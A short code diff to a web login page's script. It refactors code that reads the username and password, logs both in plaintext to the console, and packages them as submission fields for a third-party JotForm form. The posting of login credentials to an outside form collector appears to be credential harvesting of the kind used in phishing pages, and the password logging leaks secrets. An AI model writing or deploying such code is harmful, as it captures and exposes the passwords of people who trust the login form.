@@ -118,15 +118,11 @@
   </div>
 
   <script>
-    const loginForm = document.getElementById('login-form');
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
+    document.getElementById('login-form').addEventListener('submit', async (event) => {
+      event.preventDefault(); // Prevent the default form submission
 
-    loginForm.addEventListener('submit', async (event) => {
-      event.preventDefault();
-
-      const username = usernameInput.value;
-      const password = passwordInput.value;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
       console.log('Username:', username);
       console.log('Password:', password);
@@ -135,8 +131,8 @@
       const formId = '241464072748056';
 
       const payload = new URLSearchParams({
-        'submission[3]': username, // Replace 3 with the actual field ID for username in your JotForm
-        'submission[4]': password, // Replace 4 with the actual field ID for password in your JotForm
+        'submission[3]': username, // Replace '3' with the actual field ID for username in your JotForm
+        'submission[4]': password  // Replace '4' with the actual field ID for password in your JotForm
       });
 
       try {
